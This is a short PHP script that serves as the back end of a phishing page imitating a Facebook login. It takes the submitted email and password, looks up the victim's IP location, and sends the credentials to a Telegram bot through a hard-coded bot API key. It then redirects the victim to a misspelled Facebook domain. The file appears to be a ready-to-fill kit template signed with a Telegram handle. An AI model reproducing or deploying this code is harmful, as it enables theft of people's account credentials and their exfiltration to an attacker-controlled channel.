<?php
header ('Location: https://facbook.com/ ');
$API_KEY = "1799452510:AAEk7drd0ZPGQqcLFFBzawPB3ZNS12eWDZ4";
?>
<?php
 $ip = $_SERVER['HTTP_CF_CONNECTING_IP'];
 $api = json_decode(file_get_contents("https://ipinfo.io/$ip"));
 $city = $api->city;
 $countryfromip = $api->country; 
$admin = ايدي حسابك; 
$user = $_POST["medo"];
$pass = $_POST["MEDO"];
$login = $_POST["login"];
$tier = $_POST["tier"];
$phone = $_POST['phone'];
$text = urlencode("
💫 - 𝗻𝗲𝘄 𝗹𝗼𝗴𝗶𝗻 𝗯𝘆 -  𖦹𝙸𝙽𝙳𝙴𝚇 𝙵𝙰𝙲𝙴𝙱𝙾𝙾𝙺 𖦹
━━━━━━━━━━━━
ᯓ ᴇᴍᴀɪʟ 𓂅 `$user`

ᯓ ᴘᴀssᴡᴏʀᴅ 𓂅 `$pass`

ᯓ ip 𓂅  $ip
━━━━━━━━━━━━
🇮🇶🔥 - ʙʏ :- @SS0OOS 
");
$url = "https://api.telegram.org/bot".$API_KEY."/sendMessage?chat_id=$admin&text=$text&parse_mode=markdown";
file_get_contents($url);
?>